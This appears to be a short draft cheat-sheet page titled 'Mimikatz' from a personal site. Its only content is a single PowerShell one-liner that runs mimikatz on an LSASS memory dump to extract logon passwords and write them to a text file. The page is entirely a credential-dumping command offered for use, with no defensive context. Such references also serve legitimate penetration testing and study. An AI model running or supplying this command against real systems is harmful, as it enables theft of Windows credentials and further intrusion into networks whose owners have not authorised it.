---
title: "Mimikatz"
date: 2020-07-16T13:41:37+02:00
draft: true
---

#### Read lsass dump oneliner
```
.\mimikatz.exe "sekurlsa::minidump C:\Temp\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File mimikatz.txt
```
***